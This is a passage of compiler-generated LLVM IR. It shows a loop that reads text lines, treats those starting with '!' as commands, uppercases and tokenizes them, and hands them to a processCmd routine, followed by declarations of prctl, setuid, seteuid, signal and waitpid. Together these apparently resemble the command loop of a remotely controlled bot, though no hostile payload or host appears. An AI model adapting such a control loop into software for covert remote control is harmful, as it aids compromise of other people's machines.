  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %167
  store i8 0, i8* %168, align 1
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  call void @trim(i8* noundef %169)
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %171 = call i8* @strstr(i8* noundef %170, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i64 0, i64 0)) #11
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %173 = icmp eq i8* %171, %172
  br i1 %173, label %174, label %175

174:                                              ; preds = %165
  br label %85, !llvm.loop !54

175:                                              ; preds = %165
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %177 = call i8* @strstr(i8* noundef %176, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.536, i64 0, i64 0)) #11
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %179 = icmp eq i8* %177, %178
  br i1 %179, label %180, label %181

180:                                              ; preds = %175
  call void @exit(i32 noundef 0) #14
  unreachable

181:                                              ; preds = %175
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  store i8* %182, i8** %15, align 8
  %183 = load i8*, i8** %15, align 8
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 33
  br i1 %186, label %187, label %339

187:                                              ; preds = %181
  %188 = load i8*, i8** %15, align 8
  %189 = getelementptr inbounds i8, i8* %188, i64 1
  store i8* %189, i8** %16, align 8
  br label %190

190:                                              ; preds = %202, %187
  %191 = load i8*, i8** %16, align 8
  %192 = load i8, i8* %191, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp ne i32 %193, 32
  br i1 %194, label %195, label %200

195:                                              ; preds = %190
  %196 = load i8*, i8** %16, align 8
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp ne i32 %198, 0
  br label %200

200:                                              ; preds = %195, %190
  %201 = phi i1 [ false, %190 ], [ %199, %195 ]
  br i1 %201, label %202, label %205

202:                                              ; preds = %200
  %203 = load i8*, i8** %16, align 8
  %204 = getelementptr inbounds i8, i8* %203, i32 1
  store i8* %204, i8** %16, align 8
  br label %190, !llvm.loop !55

205:                                              ; preds = %200
  %206 = load i8*, i8** %16, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 0
  br i1 %209, label %210, label %211

210:                                              ; preds = %205
  br label %85, !llvm.loop !54

211:                                              ; preds = %205
  %212 = load i8*, i8** %16, align 8
  store i8 0, i8* %212, align 1
  %213 = load i8*, i8** %15, align 8
  %214 = getelementptr inbounds i8, i8* %213, i64 1
  store i8* %214, i8** %16, align 8
  %215 = load i8*, i8** %15, align 8
  %216 = load i8*, i8** %16, align 8
  %217 = call i64 @strlen(i8* noundef %216) #11
  %218 = getelementptr inbounds i8, i8* %215, i64 %217
  %219 = getelementptr inbounds i8, i8* %218, i64 2
  store i8* %219, i8** %15, align 8
  br label %220

220:                                              ; preds = %240, %211
  %221 = load i8*, i8** %15, align 8
  %222 = load i8*, i8** %15, align 8
  %223 = call i64 @strlen(i8* noundef %222) #11
  %224 = sub i64 %223, 1
  %225 = getelementptr inbounds i8, i8* %221, i64 %224
  %226 = load i8, i8* %225, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp eq i32 %227, 10
  br i1 %228, label %238, label %229

229:                                              ; preds = %220
  %230 = load i8*, i8** %15, align 8
  %231 = load i8*, i8** %15, align 8
  %232 = call i64 @strlen(i8* noundef %231) #11
  %233 = sub i64 %232, 1
  %234 = getelementptr inbounds i8, i8* %230, i64 %233
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 13
  br label %238

238:                                              ; preds = %229, %220
  %239 = phi i1 [ true, %220 ], [ %237, %229 ]
  br i1 %239, label %240, label %246

240:                                              ; preds = %238
  %241 = load i8*, i8** %15, align 8
  %242 = load i8*, i8** %15, align 8
  %243 = call i64 @strlen(i8* noundef %242) #11
  %244 = sub i64 %243, 1
  %245 = getelementptr inbounds i8, i8* %241, i64 %244
  store i8 0, i8* %245, align 1
  br label %220, !llvm.loop !56

246:                                              ; preds = %238
  %247 = load i8*, i8** %15, align 8
  store i8* %247, i8** %17, align 8
  br label %248

248:                                              ; preds = %260, %246
  %249 = load i8*, i8** %15, align 8
  %250 = load i8, i8* %249, align 1
  %251 = zext i8 %250 to i32
  %252 = icmp ne i32 %251, 32
  br i1 %252, label %253, label %258

253:                                              ; preds = %248
  %254 = load i8*, i8** %15, align 8
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp ne i32 %256, 0
  br label %258

258:                                              ; preds = %253, %248
  %259 = phi i1 [ false, %248 ], [ %257, %253 ]
  br i1 %259, label %260, label %263

260:                                              ; preds = %258
  %261 = load i8*, i8** %15, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %15, align 8
  br label %248, !llvm.loop !57

263:                                              ; preds = %258
  %264 = load i8*, i8** %15, align 8
  store i8 0, i8* %264, align 1
  %265 = load i8*, i8** %15, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %15, align 8
  %267 = load i8*, i8** %17, align 8
  store i8* %267, i8** %18, align 8
  br label %268

268:                                              ; preds = %272, %263
  %269 = load i8*, i8** %18, align 8
  %270 = load i8, i8* %269, align 1
  %271 = icmp ne i8 %270, 0
  br i1 %271, label %272, label %281

272:                                              ; preds = %268
  %273 = load i8*, i8** %18, align 8
  %274 = load i8, i8* %273, align 1
  %275 = zext i8 %274 to i32
  %276 = call i32 @toupper(i32 noundef %275) #11
  %277 = trunc i32 %276 to i8
  %278 = load i8*, i8** %18, align 8
  store i8 %277, i8* %278, align 1
  %279 = load i8*, i8** %18, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %18, align 8
  br label %268, !llvm.loop !58

281:                                              ; preds = %268
  store i32 1, i32* %20, align 4
  %282 = load i8*, i8** %15, align 8
  %283 = call i8* @strtok(i8* noundef %282, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.537, i64 0, i64 0)) #10
  store i8* %283, i8** %21, align 8
  %284 = load i8*, i8** %17, align 8
  %285 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %284, i8** %285, align 16
  br label %286

286:                                              ; preds = %317, %281
  %287 = load i8*, i8** %21, align 8
  %288 = icmp ne i8* %287, null
  br i1 %288, label %289, label %319

289:                                              ; preds = %286
  %290 = load i8*, i8** %21, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  %293 = icmp ne i32 %292, 10
  br i1 %293, label %294, label %317

294:                                              ; preds = %289
  %295 = load i8*, i8** %21, align 8
  %296 = call i64 @strlen(i8* noundef %295) #11
  %297 = add i64 %296, 1
  %298 = call noalias i8* @malloc(i64 noundef %297) #10
  %299 = load i32, i32* %20, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %300
  store i8* %298, i8** %301, align 8
  %302 = load i32, i32* %20, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %303
  %305 = load i8*, i8** %304, align 8
  %306 = load i8*, i8** %21, align 8
  %307 = call i64 @strlen(i8* noundef %306) #11
  %308 = add i64 %307, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %305, i8 0, i64 %308, i1 false)
  %309 = load i32, i32* %20, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %310
  %312 = load i8*, i8** %311, align 8
  %313 = load i8*, i8** %21, align 8
  %314 = call i8* @strcpy(i8* noundef %312, i8* noundef %313) #10
  %315 = load i32, i32* %20, align 4
  %316 = add nsw i32 %315, 1
  store i32 %316, i32* %20, align 4
  br label %317

317:                                              ; preds = %294, %289
  %318 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.537, i64 0, i64 0)) #10
  store i8* %318, i8** %21, align 8
  br label %286, !llvm.loop !59

319:                                              ; preds = %286
  %320 = load i32, i32* %20, align 4
  %321 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  call void @processCmd(i32 noundef %320, i8** noundef %321)
  %322 = load i32, i32* %20, align 4
  %323 = icmp sgt i32 %322, 1
  br i1 %323, label %324, label %338

324:                                              ; preds = %319
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %325

325:                                              ; preds = %334, %324
  %326 = load i32, i32* %22, align 4
  %327 = load i32, i32* %20, align 4
  %328 = icmp slt i32 %326, %327
  br i1 %328, label %329, label %337

329:                                              ; preds = %325
  %330 = load i32, i32* %22, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  call void @free(i8* noundef %333) #10
  br label %334

334:                                              ; preds = %329
  %335 = load i32, i32* %22, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %22, align 4
  br label %325, !llvm.loop !60

337:                                              ; preds = %325
  br label %338

338:                                              ; preds = %337, %319
  br label %339

339:                                              ; preds = %338, %181
  br label %85, !llvm.loop !54

340:                                              ; preds = %85
  br label %341

341:                                              ; preds = %340, %72
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8* noundef, i8* noundef, i64 noundef) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32 noundef, i32* noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i32 @chdir(i8* noundef) #3

; Function Attrs: nounwind
declare i32 @setuid(i32 noundef) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32 noundef) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32 noundef, void (i32)* noundef) #3

declare i32 @sleep(i32 noundef) #1

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { argmemonly nofree nounwind willreturn writeonly }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { nofree nosync nounwind willreturn }
attributes #6 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { argmemonly nofree nounwind willreturn }
attributes #8 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readonly willreturn }
attributes #12 = { nounwind readnone willreturn }
attributes #13 = { noreturn }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
